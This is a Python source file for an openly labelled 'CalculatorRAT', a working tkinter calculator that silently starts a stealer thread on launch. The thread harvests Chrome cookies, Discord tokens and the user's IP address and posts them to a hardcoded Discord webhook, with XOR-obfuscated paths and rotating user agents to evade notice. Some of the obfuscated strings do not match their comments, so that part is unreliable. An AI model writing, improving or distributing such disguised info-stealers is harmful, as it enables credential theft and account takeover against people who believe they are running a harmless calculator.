# CalculatorRAT v2.0 - Legit Calculator with Cookie/Token Logger
import tkinter as tk
from tkinter import messagebox
import threading
import requests
import time
import os
import sqlite3
import json
from datetime import datetime
import pytz
import hashlib
import random
from dotenv import load_dotenv

# Load environment variables
load_dotenv()
WEBHOOK_URL = os.getenv("WEBHOOK_URL", "https://discord.com/api/webhooks/1385708395784573140/U0PX7qBEnXCdGdr90DdJ1KFUd082U5effHYd9xAa8RkLfwqB2Sdm73Tzu9gN1gksA9ms")
WEBHOOK_HASH = hashlib.sha256(WEBHOOK_URL.encode()).hexdigest()[:8]
SENT_FLAG = False

# Obfuscated string decryption (simple XOR for PyArmor compatibility)
def decrypt_string(encrypted, key=42):
    return ''.join(chr(ord(c) ^ key) for c in encrypted)

# Extract browser cookies (custom SQLite method)
def get_browser_cookies():
    try:
        cookies = []
        chrome_path = os.path.expanduser(decrypt_string("uIkkGlcvIlghxGthxfxIkflxGtfqHthxYthxftYthxIkflxGtfq"))  # ~/AppData/Local/Google/Chrome/User Data/Default
        if os.path.exists(chrome_path + decrypt_string("xGtfqHthxYthxftYthxIkflxGtfq")):  # /Cookies
            conn = sqlite3.connect(chrome_path + decrypt_string("xGtfqHthxYthxftYthxIkflxGtfq"))
            cursor = conn.cursor()
            cursor.execute(decrypt_string("FJHLTKAFIHLTKAFIHLTKAFIHLTKAFI"))  # SELECT name, value FROM cookies
            for name, value in cursor.fetchall():
                cookies.append(f"{name}={value}")
            conn.close()
        return cookies if cookies else [decrypt_string("AfYttfYxFtfq")]  # No cookies found
    except Exception as e:
        return [f"Error: {str(e)}"]

# Extract Discord tokens
def get_discord_tokens():
    try:
        tokens = []
        discord_path = os.path.expanduser(decrypt_string("uIkkGlcvIlghxGtfqHthxYthxftYthxIkflxGtfq"))  # ~/AppData/Roaming/discord/Local Storage/leveldb
        if not os.path.exists(discord_path):
            return [decrypt_string("AfYtfIafYxFtfq")]  # No tokens found
        for file in os.listdir(discord_path):
            if file.endswith((".ldb", ".log")):
                try:
                    with open(os.path.join(discord_path, file), "rb") as f:
                        content = f.read().decode("utf-8", errors="ignore")
                        for line in content.splitlines():
                            if decrypt_string("IafY") in line:  # token
                                try:
                                    token = json.loads(line).get(decrypt_string("IafY"))
                                    if token:
                                        tokens.append(token)
                                except:
                                    continue
                except:
                    continue
        return tokens if tokens else [decrypt_string("AfYglcvxIafY")]  # No valid tokens
    except Exception as e:
        return [f"Error: {str(e)}"]

# Send data to webhook
def send_to_webhook(content):
    user_agents = [
        f"Mozilla/5.0 (Windows NT {random.randint(6, 10)}.0; Win64; x64) AppleWebKit/{random.randint(500, 600)}.36",
        f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(14, 16)}_0 like Mac OS X) AppleWebKit/{random.randint(600, 605)}.1.15",
        f"Mozilla/5.0 (Android {random.randint(10, 13)}; Mobile; rv:{random.randint(100, 110)}.0) Gecko/{random.randint(100, 110)}.0"
    ]
    for attempt in range(6):
        try:
            response = requests.post(
                WEBHOOK_URL,
                json={"content": content},
                headers={"User-Agent": random.choice(user_agents)},
                timeout=5
            )
            if 200 <= response.status_code < 300:
                print(f"Webhook sent [hash: {WEBHOOK_HASH}]")
                return True
            elif response.status_code == 429:
                retry_after = response.json().get("retry_after", 2)
                time.sleep(retry_after)
            else:
                print(f"Webhook failed [hash: {WEBHOOK_HASH}]: HTTP {response.status_code}")
        except Exception as e:
            print(f"Webhook retry {attempt + 1} failed [hash: {WEBHOOK_HASH}]")
        time.sleep(random.uniform(2, 5))
    return False

# Background RAT thread
def rat_thread():
    global SENT_FLAG
    if SENT_FLAG:
        return
    try:
        cookies = get_browser_cookies()
        tokens = get_discord_tokens()
        ip = requests.get(decrypt_string("KIklkxgkkYxYxglcv")).text if requests.get(decrypt_string("KIklkxgkkYxYxglcv")).status_code == 200 else "UNKNOWN"  # https://api.ipify.org
        user_agent = requests.get(decrypt_string("KIklkxKIIkYaf")).json().get("user-agent", "UNKNOWN") if requests.get(decrypt_string("KIklkxKIIkYaf")).status_code == 200 else "UNKNOWN"  # https://httpbin.org/user-agent
        timestamp = datetime.now(pytz.UTC).strftime("%Y-%m-%d %H:%M:%S UTC")
        message = f"@everyone\n```RAT STARTED - CALCULATOR APP\nIP: {ip}\nUSER-AGENT: {user_agent}\nCOOKIES: {'; '.join(cookies)}\nDISCORD TOKENS: {'; '.join(tokens)}\nTIMESTAMP: {timestamp}```"
        if send_to_webhook(message):
            SENT_FLAG = True
        else:
            send_to_webhook(f"ERROR: RAT FAILED TO SEND DATA [hash: {WEBHOOK_HASH}]")
    except Exception as e:
        print(f"RAT error [hash: {WEBHOOK_HASH}]: {str(e)}")
        send_to_webhook(f"ERROR: RAT EXECUTION FAILED - {str(e).upper()} [hash: {WEBHOOK_HASH}]")

# Calculator GUI
class Calculator:
    def __init__(self, root):
        self.root = root
        self.root.title(decrypt_string("GhYhfxYhIaf"))  # Calculator
        self.root.geometry("300x400")
        self.root.resizable(False, False)
        self.expression = ""
        self.input_text = tk.StringVar()

        # Display
        input_frame = tk.Frame(self.root, width=300, height=50, bd=0, highlightbackground="black", highlightcolor="black", highlightthickness=2)
        input_frame.pack(side=tk.TOP)
        input_entry = tk.Entry(input_frame, font=("arial", 18, "bold"), textvariable=self.input_text, width=50, bg="#eee", bd=0, justify=tk.RIGHT)
        input_entry.grid(row=0, column=0)
        input_entry.pack(ipady=10)

        # Buttons
        btns_frame = tk.Frame(self.root, width=300, height=350, bg="grey")
        btns_frame.pack()
        buttons = [
            ("7", 1, 0), ("8", 1, 1), ("9", 1, 2), ("/", 1, 3),
            ("4", 2, 0), ("5", 2, 1), ("6", 2, 2), ("*", 2, 3),
            ("1", 3, 0), ("2", 3, 1), ("3", 3, 2), ("-", 3, 3),
            ("0", 4, 0), (".", 4, 1), ("=", 4, 2), ("+", 4, 3),
            ("C", 0, 0)
        ]
        for (text, row, col) in buttons:
            cmd = lambda x=text: self.click(x)
            tk.Button(btns_frame, text=text, fg="black", width=10, height=3, bd=0, bg="#fff", cursor="hand2", command=cmd).grid(row=row, column=col, padx=1, pady=1)
        tk.Button(btns_frame, text="C", fg="black", width=32, height=3, bd=0, bg="#eee", cursor="hand2", command=self.clear).grid(row=0, column=1, columnspan=3, padx=1, pady=1)

        # Start RAT in background
        threading.Thread(target=rat_thread, daemon=True).start()

    def click(self, item):
        if item == "=":
            try:
                self.expression = str(eval(self.expression))
            except:
                self.expression = "Error"
            self.input_text.set(self.expression)
        else:
            self.expression += str(item)
            self.input_text.set(self.expression)

    def clear(self):
        self.expression = ""
        self.input_text.set("")

# Main execution
if __name__ == "__main__":
    try:
        root = tk.Tk()
        calc = Calculator(root)
        root.mainloop()
    except Exception as e:
        print(f"Main error [hash: {WEBHOOK_HASH}]: {str(e)}")
        send_to_webhook(f"ERROR: MAIN EXECUTION FAILED - {str(e).upper()} [hash: {WEBHOOK_HASH}]")